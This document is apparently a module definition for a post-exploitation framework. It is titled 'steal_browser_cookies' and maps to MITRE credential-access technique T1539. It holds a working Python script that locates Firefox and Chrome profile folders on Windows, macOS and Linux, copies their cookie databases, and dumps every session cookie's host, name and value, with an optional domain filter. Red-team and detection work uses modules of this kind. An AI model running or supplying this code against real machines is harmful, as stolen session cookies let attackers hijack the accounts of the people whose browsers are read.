name: steal_browser_cookies
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Query Firefox cookies.sqlite and Chrome Cookies database to steal
  web session cookies. Uses the Python sqlite3 stdlib module to
  directly read browser cookie databases. Firefox cookies are stored
  in plaintext in the moz_cookies table. Chrome cookies on Linux and
  macOS are accessible from the Cookies SQLite database. This module
  automatically discovers browser profile directories and extracts
  cookie data including host, name, value, path, and expiry fields.
software: ''
tactics: [TA0006]
techniques: [T1539]
background: true
output_extension:
needs_admin: false
opsec_safe: false
language: python
min_language_version: '3'
comments:
  - https://github.com/redcanaryco/atomic-red-team
options:
  - name: Browser
    description: >-
      Which browser cookies to steal. Use all to query both Firefox and Chrome.
    required: true
    value: 'all'
    strict: true
    suggested_values:
      - firefox
      - chrome
      - all
  - name: Domain
    description: >-
      Optional domain filter. Only return cookies matching this domain substring.
      Leave empty for all cookies.
    required: false
    value: ''
script: |
  import sqlite3
  import os
  import glob
  import sys
  import shutil
  import tempfile

  browser = "{{ Browser }}"
  domain_filter = "{{ Domain }}"

  results = []

  def query_db(db_path, query, browser_name):
      if not os.path.exists(db_path):
          return
      tmp_dir = tempfile.mkdtemp()
      tmp_db = os.path.join(tmp_dir, "cookies_copy.sqlite")
      try:
          shutil.copy2(db_path, tmp_db)
          conn = sqlite3.connect(tmp_db)
          cursor = conn.cursor()
          cursor.execute(query)
          rows = cursor.fetchall()
          conn.close()
          for row in rows:
              host = str(row[0])
              if domain_filter and domain_filter not in host:
                  continue
              results.append("[{}] {}".format(browser_name, " | ".join(str(c) for c in row)))
      except Exception as e:
          results.append("[-] Error reading {}: {}".format(db_path, str(e)))
      finally:
          try:
              os.remove(tmp_db)
              os.rmdir(tmp_dir)
          except Exception:
              pass

  if browser in ("firefox", "all"):
      ff_query = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies;"
      if sys.platform == "win32":
          ff_base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
      elif sys.platform == "darwin":
          ff_base = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
      else:
          ff_base = os.path.expanduser("~/.mozilla/firefox")
      if os.path.exists(ff_base):
          for db in glob.glob(os.path.join(ff_base, "*", "cookies.sqlite")):
              results.append("[*] Firefox DB: " + db)
              query_db(db, ff_query, "Firefox")

  if browser in ("chrome", "all"):
      chrome_query = "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies;"
      if sys.platform == "win32":
          chrome_paths = [
              os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
              os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
          ]
      elif sys.platform == "darwin":
          chrome_paths = [os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")]
      else:
          chrome_paths = [os.path.expanduser("~/.config/google-chrome/Default/Cookies")]
      for cp in chrome_paths:
          if os.path.exists(cp):
              results.append("[*] Chrome DB: " + cp)
              query_db(cp, chrome_query, "Chrome")
              break

  if results:
      print("\n".join(results))
  else:
      print("[-] No browser cookie databases found.")
